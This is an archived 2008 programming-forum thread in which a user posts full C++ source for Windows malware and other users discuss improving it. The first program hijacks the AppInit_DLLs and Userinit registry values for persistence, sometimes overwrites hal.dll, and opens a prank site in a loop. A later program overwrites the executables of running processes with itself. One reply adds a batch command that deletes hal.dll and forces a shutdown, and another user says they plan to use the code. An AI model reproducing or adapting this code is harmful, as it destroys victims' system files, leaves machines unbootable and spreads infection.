<!DOCTYPE html>
<html lang="en-US">
  
<!-- Mirrored from forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008 by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Aug 2019 14:32:39 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>[C++]Simple C++ annoyer/virus - General Programming - moparisthebest.com</title>
    <meta name="description" content="I was bored and felt like making a virus, here&amp;#39;s the source, do NOT compile it, do NOT run it, and do NOT give it to anyone. This is meant only for learning purposes, which is why I commented the source. 

 #include &amp;lt;win&amp;hellip;">
    <meta name="generator" content="Discourse 2.3.2 - https://github.com/discourse/discourse version c587df7e2a03c2962f4c8cefd6f03969bb87d525">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/1/1f0dc167bcf798bdbd70b03bf0fd1bc836e54e1a_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff_2_180x180.png">
<meta name="theme-color" content="#0088cc">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="231008.html" />
<script type="application/ld+json">{"@context":"http://schema.org","@type":"WebSite","url":"https://forum.moparisthebest.com","potentialAction":{"@type":"SearchAction","target":"https://forum.moparisthebest.com/search?q={search_term_string}","query-input":"required name=search_term_string"}}</script>
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="moparisthebest.com Search">

      <link href="../../stylesheets/desktop_1_ec9f75e3d0b2a904642ce53663991837b70cda3334fc.css?__ws=forum.moparisthebest.com" media="all" rel="stylesheet" data-target="desktop" data-theme-id="2"/>
      <link href="../../stylesheets/desktop_theme_2_6707e7ee46ac9f2f0510c29ddd10e8f6ce21c1ae34fc.css?__ws=forum.moparisthebest.com" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="2"/>
    
    
      <link rel="alternate" type="application/rss+xml" title="RSS feed of &#39;[C++]Simple C++ annoyer/virus&#39;" href="231008.rss" />
  <meta property="og:site_name" content="moparisthebest.com" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://forum.moparisthebest.com/uploads/default/original/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff.png" />
<meta property="og:image" content="https://forum.moparisthebest.com/uploads/default/original/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff.png" />
<meta property="og:url" content="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008" />
<meta name="twitter:url" content="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008" />
<meta property="og:title" content="[C++]Simple C++ annoyer/virus" />
<meta name="twitter:title" content="[C++]Simple C++ annoyer/virus" />
<meta property="og:description" content="I was bored and felt like making a virus, here’s the source, do NOT compile it, do NOT run it, and do NOT give it to anyone. This is meant only for learning purposes, which is why I commented the source.  #include &lt;windows.h&gt; #include &lt;string&gt;   char sysdir[MAX_PATH]; char pathtofile[MAX_PATH];  void RegSet() {     HKEY hKey;     RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;,0,KEY_SET_VALUE,&amp;hKey);     RegSetValueEx(hKey, &quot;AppInit_DLLs&quot;,0,REG_SZ,(cons..." />
<meta name="twitter:description" content="I was bored and felt like making a virus, here’s the source, do NOT compile it, do NOT run it, and do NOT give it to anyone. This is meant only for learning purposes, which is why I commented the source.  #include &lt;windows.h&gt; #include &lt;string&gt;   char sysdir[MAX_PATH]; char pathtofile[MAX_PATH];  void RegSet() {     HKEY hKey;     RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;,0,KEY_SET_VALUE,&amp;hKey);     RegSetValueEx(hKey, &quot;AppInit_DLLs&quot;,0,REG_SZ,(cons..." />
<meta property="article:published_time" content="2008-09-14T00:00:14+00:00" />
<meta property="og:ignore_canonical" content="true" />



    
  </head>
  <body class="crawler">
    
    <header>
      <a href="../../index.html">
          <img src="../../uploads/default/original/2X/3/37bba8fb3bd06c372ab54fa72ec38bf9f8f40b37.gif" alt="moparisthebest.com" id="site-logo" style="max-width: 150px;">
      </a>
    </header>
    <div id="main-outlet" class="wrap">
      <h1 class="crawler-topic-title">
  <a href="231008.html">[C++]Simple C++ annoyer/virus</a>
</h1>

<div id='breadcrumbs'>
    <div id="breadcrumb-0" itemscope itemtype="http://data-vocabulary.org/Breadcrumb"
>
      <a href="../../c/general-programming.html" itemprop="url" class='badge-wrapper bullet'>
        <span class="badge-category-bg"></span>
        <span itemprop="title" class='category-title'>General Programming</span>
      </a>
    </div>
</div>





  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-09-14T00:00:14Z'>
            <time itemprop='dateModified' datetime='2016-07-31T01:35:40Z' class='post-time'>
              July 31, 2016,  1:35am
            </time>
        <span itemprop='position'>#1</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>I was bored and felt like making a virus, here’s the source, do NOT compile it, do NOT run it, and do NOT give it to anyone. This is meant only for learning purposes, which is why I commented the source.</p>
<pre><code class="lang-auto">#include &lt;windows.h&gt;
#include &lt;string&gt;


char sysdir[MAX_PATH];
char pathtofile[MAX_PATH];

void RegSet()
{
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",0,KEY_SET_VALUE,&amp;hKey);
    RegSetValueEx(hKey, "AppInit_DLLs",0,REG_SZ,(const unsigned char*)sysdir, sizeof(sysdir));
    //basically makes it so it cant be deleted, ---&gt; google.com
        
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",0,KEY_SET_VALUE,&amp;hKey);
    RegSetValueEx(hKey, "Userinit",0,REG_SZ,(const unsigned char*)sysdir, sizeof(sysdir));
    //replaces userinit.exe for startup, good backup system =)
}

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE PrevInstance, LPSTR lpzArgument, int nFunsterStil)
{
    HWND hWnd;
    HMODULE GetModH = GetModuleHandle(NULL);
             
    GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
    GetSystemDirectory(sysdir, sizeof(sysdir));
    
    strcat(sysdir, "\\winxphelp.exe");
    
    std::string sysdirStr = sysdir;
    std::string pathtofileStr = pathtofile;
    if (pathtofileStr != sysdirStr)
    {
        CopyFile(pathtofile, sysdir, true);
        RegSet();
        
        //ShellExecute(hWnd, "open", sysdir, NULL,NULL,SW_SHOWDEFAULT);
                //removed this so it will just start on next startup, and remains idle until then.
        return 0;
    }
    
    ShellExecute(hWnd, "open", "explorer.exe", NULL,NULL,SW_SHOWDEFAULT); //Since userinit.dll no longer starts on startup, we need something to
                                                                        //start explorer.exe. The bonus is if they do delete this virus, the registry
                                                                        //value is still set, so userinit.exe wont start, and thus explorer.exe wont
                                                                        //start anymore.
    
    srand((unsigned)time(0));
    int Kill = (rand()%20) + 1;
    if(Kill == 13) //this could be anything, really (1 - 20)
    {
        CopyFile(pathtofile, "%systemroot%\\System32\\hal.dll", false); //1 in 20 chance of "infecting" hal.dll (per startup)
    }
    //Doesn't simple delete hall.dll, as that would make it easy to fix it with the restore console. If it's replaced, a
    //hal.dll is still technically there, so it's not as easily fixed.
    
    Sleep(600000); //Give them 10 minutes before it messes with them, to keep a somewhat low profile.
    
    int count = 0;
    while(true)
    {
        RegSet();
        
        if (count == 179) //"You are an idiot" every 3 minutes.
        {
            ShellExecute(hWnd, "open", "http://www.youareanidiot.org/youare.swf", NULL,NULL,SW_SHOWDEFAULT);
            count = 0;
        }
        count++;
        Sleep(1000);
        
    }
    
    return 0;
}</code></pre>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-09-14T20:35:12Z'>
            <time itemprop='dateModified' datetime='2016-07-31T01:36:44Z' class='post-time'>
              July 31, 2016,  1:36am
            </time>
        <span itemprop='position'>#2</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>That’s exactly why I put annoyer first, I was tempted to quote “virus”. If I really wanted to make a virus, you wouldn’t see it here.</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Real-life_Hacker.html'><span itemprop='name'>Real-life_Hacker</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-09-15T00:06:13Z'>
            <time itemprop='dateModified' datetime='2016-07-31T01:37:02Z' class='post-time'>
              July 31, 2016,  1:37am
            </time>
        <span itemprop='position'>#3</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p><code>    if(Kill = 13) //this could be anything, really (1 - 20)
    {
        CopyFile(pathtofile, "%systemroot%\\System32\\hal.dll", false); //1 in 20 chance of "infecting" hal.dll (per startup)
    }</code> woah cool!!!</p>
<p>btw u dumbass by doing that itll always infect hall.dll because an assignment is always ‘true’</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="1" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-09-15T00:33:47Z'>
            <time itemprop='dateModified' datetime='2016-07-31T01:37:03Z' class='post-time'>
              July 31, 2016,  1:37am
            </time>
        <span itemprop='position'>#4</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>[quote=“Real-life Hacker, post:3, topic:231008”]<code>    if(Kill = 13) //this could be anything, really (1 - 20)
    {
        CopyFile(pathtofile, "%systemroot%\\System32\\hal.dll", false); //1 in 20 chance of "infecting" hal.dll (per startup)
    }</code> woah cool!!!</p>
<p>btw u dumbass by doing that itll always infect hall.dll because an assignment is always ‘true’[/quote]<br>
Good point, forgot ==.</p>
<p>Fixed.</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Real-life_Hacker.html'><span itemprop='name'>Real-life_Hacker</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-09-15T01:29:40Z'>
            <time itemprop='dateModified' datetime='2016-07-31T01:37:07Z' class='post-time'>
              July 31, 2016,  1:37am
            </time>
        <span itemprop='position'>#5</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>woops no need to have called u a dumbass[br][br][size=1]Posted on: September 14, 2008, 07:31:26 pm[/size][hr]btw replacing Userinit registry key can fuck up windows. also why use \Windows NT. attempt both \Windows and \Windows NT. use \CurrentVersion\Run to add to startup[br][br][size=1]Posted on: September 14, 2008, 07:32:33 pm[/size][hr]btw add more to payload</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="1" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-09-15T03:35:31Z'>
            <time itemprop='dateModified' datetime='2016-07-31T01:37:16Z' class='post-time'>
              July 31, 2016,  1:37am
            </time>
        <span itemprop='position'>#6</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <aside class="quote no-group" data-post="5" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
 Real-life Hacker:</div>
<blockquote>
<p>woops no need to have called u a dumbass</p>
</blockquote>
</aside>
<p>It’s cool.</p>
<aside class="quote no-group" data-post="5" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
 Real-life Hacker:</div>
<blockquote>
<p>btw replacing Userinit registry key can fuck up windows. also why use \Windows NT. attempt both \Windows and \Windows NT. use \CurrentVersion\Run to add to startup</p>
</blockquote>
</aside>
<p>I don’t see how that’s a problem, seeing how its malicious in nature. And if I did that, it would run 3 times, which isn’t what I want. I guess I could have it detect whether or not its already running, and if so, then exit.</p>
<aside class="quote no-group" data-post="5" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
 Real-life Hacker:</div>
<blockquote>
<p>btw add more to payload</p>
</blockquote>
</aside>
<p>Like? I was thinking of it detecting when a new .exe process starts, and adding it to a list in a txt file. And on next startup, it, one by one, copies itself over one of the .exe’s on the list, removes it from the list, and moves on to the next one.</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/xEnt.html'><span itemprop='name'>xEnt</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-09-24T23:49:17Z'>
            <time itemprop='dateModified' datetime='2016-07-31T01:51:34Z' class='post-time'>
              July 31, 2016,  1:51am
            </time>
        <span itemprop='position'>#7</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>echo i is in yur computerz<br>
echo Y | DEL %windir%/system32/hal.dll<br>
shutdown -f</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-12-14T23:33:09Z'>
            <time itemprop='dateModified' datetime='2016-07-31T04:00:51Z' class='post-time'>
              July 31, 2016,  4:00am
            </time>
        <span itemprop='position'>#8</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>Here’s a better one, posting it for the hell of it:</p>
<pre><code class="lang-auto">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;Tlhelp32.h&gt;
#include &lt;string&gt;
#include &lt;fstream&gt;
#include &lt;direct.h&gt;

char winDir[MAX_PATH];
char startup[MAX_PATH];
HKEY hKey;

void TargetList() {
    HMODULE GetModH = GetModuleHandle(NULL);
    char self[MAX_PATH];
    GetModuleFileName(GetModH, self, sizeof(self));
    
    std::ifstream TarListIn;
    std::ifstream exeCheck;
    std::string targetPath;
    TarListIn.open(winDir, std::ios::in);
    exeCheck.open(startup, std::ios::in | std::ios::binary);
    std::getline (TarListIn, targetPath);
    //std::cout &lt;&lt; "\"" &lt;&lt; path &lt;&lt; "\"" &lt;&lt; std::endl;
    //std::cin.get();
    if(TarListIn.is_open() &amp;&amp; exeCheck.is_open()) {
        while(!TarListIn.eof()) {
            std::getline (TarListIn, targetPath);
            CopyFile(self, targetPath.c_str(), false);
            Sleep(50);
            //DeleteFile(path.c_str());
        }
        TarListIn.close();
    } else {
        CopyFile(self, startup, false);
        Sleep(100);
    }
    
}

void GenerateList() {
    std::ofstream TarListOut;
    std::string filePath;
    PROCESSENTRY32 sEntry;
    MODULEENTRY32 mEntry;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE ModSnap;
    
    sEntry.dwSize = sizeof(PROCESSENTRY32);
    mEntry.dwSize = sizeof(MODULEENTRY32);
    
    ModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, sEntry.th32ProcessID);
    Module32First(ModSnap, &amp;mEntry);
    std::string path;
    
    TarListOut.open(winDir, std::ios::out);    
    while(Process32Next(snapshot, &amp;sEntry)){
        ModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, sEntry.th32ProcessID);
        Module32Next(ModSnap, &amp;mEntry);
        filePath = mEntry.szExePath;
        if(filePath.find("\\") &lt; MAX_PATH) {
            TarListOut &lt;&lt; filePath &lt;&lt; std::endl; 
        }
    }
    TarListOut.close();
}

int main() {
    int reps;
    GetWindowsDirectory(startup, sizeof(startup));
    strcat(startup, "\\filehelper.exe");
    GetWindowsDirectory(winDir, sizeof(winDir));
    strcat(winDir, "\\files.txt");
    
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &amp;hKey);
    RegSetValueEx(hKey, "File info", 0, REG_SZ,(const unsigned char*)startup, sizeof(startup));
    RegCloseKey(hKey);
    while(true) {
        TargetList();
        if(reps &gt;= 9) {
            GenerateList();
            reps = 0;
        } else {reps++;}
    }
    
    return 0;
}</code></pre>
<p>More payload.</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-12-16T23:54:49Z'>
            <time itemprop='dateModified' datetime='2016-07-31T04:03:09Z' class='post-time'>
              July 31, 2016,  4:03am
            </time>
        <span itemprop='position'>#9</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>[quote=“Coder xynt, post:1, topic:250824”][quote author=Cain_ link=topic=304212.msg2439385#msg2439385 date=1221379690]<br>
that’s not a virus<br>
[/quote][/quote]<br>
I know, it’s a trojan.</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/ringer24.html'><span itemprop='name'>ringer24</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-12-17T06:08:13Z'>
            <time itemprop='dateModified' datetime='2016-07-31T04:04:10Z' class='post-time'>
              July 31, 2016,  4:04am
            </time>
        <span itemprop='position'>#10</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=\</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="1" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-12-17T07:27:10Z'>
            <time itemprop='dateModified' datetime='2019-01-13T17:20:55Z' class='post-time'>
              January 13, 2019,  5:20pm
            </time>
        <span itemprop='position'>#11</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <aside class="quote no-group quote-modified" data-post="10" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../letter_avatar/ringer24/40/5_6bca9977b612b7aeef77ba1ec1cd67b3.png" class="avatar"> ringer24:</div>
<blockquote>
<p>Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=\</p>
</blockquote>
</aside>
<p>I get the feeling you don’t even know what it’s supposed to do. The 2nd one, anyway.</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="1" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/ringer24.html'><span itemprop='name'>ringer24</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-12-18T00:44:03Z'>
            <time itemprop='dateModified' datetime='2016-07-31T04:05:22Z' class='post-time'>
              July 31, 2016,  4:05am
            </time>
        <span itemprop='position'>#12</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>[quote=“Zach1188, post:11, topic:231008”][quote author=ringer24 link=topic=304212.msg2585883#msg2585883 date=1229494093]<br>
Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=<br>
[/quote]<br>
I get the feeling you don’t even know what it’s supposed to do. The 2nd one, anyway.[/quote]<br>
The first one is the one i shall be using :).</p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="1" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Zach1188.html'><span itemprop='name'>Zach1188</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-12-18T05:12:25Z'>
            <time itemprop='dateModified' datetime='2016-07-31T04:05:43Z' class='post-time'>
              July 31, 2016,  4:05am
            </time>
        <span itemprop='position'>#13</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>[quote=“ringer24, post:12, topic:231008”][quote author=Zach1188 link=topic=304212.msg2585911#msg2585911 date=1229498830]</p>
<aside class="quote no-group">
<blockquote>
<p>Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=\</p>
</blockquote>
</aside>
<p>I get the feeling you don’t even know what it’s supposed to do. The 2nd one, anyway.<br>
[/quote]<br>
The first one is the one i shall be using :).[/quote]<br>
Try out the 2nd one <img src="../../images/emoji/twitter/wink1bce.png?v=6" title=":wink:" class="emoji" alt=":wink:"></p>
      </div>

      <meta itemprop='headline' content='[C++]Simple C++ annoyer/virus'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>






    </div>
    <footer class="container wrap">
      <nav class='crawler-nav' itemscope itemtype='http://schema.org/SiteNavigationElement'>
        <ul>
        <li itemprop="name"><a href='../../index.html' itemprop="url">Home </a></li>
        <li itemprop="name"><a href='../../categories.html' itemprop="url">Categories </a></li>
        <li itemprop="name"><a href='../../guidelines.html' itemprop="url">FAQ/Guidelines </a></li>
        <li itemprop="name"><a href='../../tos.html' itemprop="url">Terms of Service </a></li>
        <li itemprop="name"><a href='../../privacy.html' itemprop="url">Privacy Policy </a></li>
        </ul>
      </nav>
      <p class='powered-by-link'>Powered by <a href="https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
    </footer>
    
  </body>
  

<!-- Mirrored from forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008 by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Aug 2019 14:32:42 GMT -->
</html>
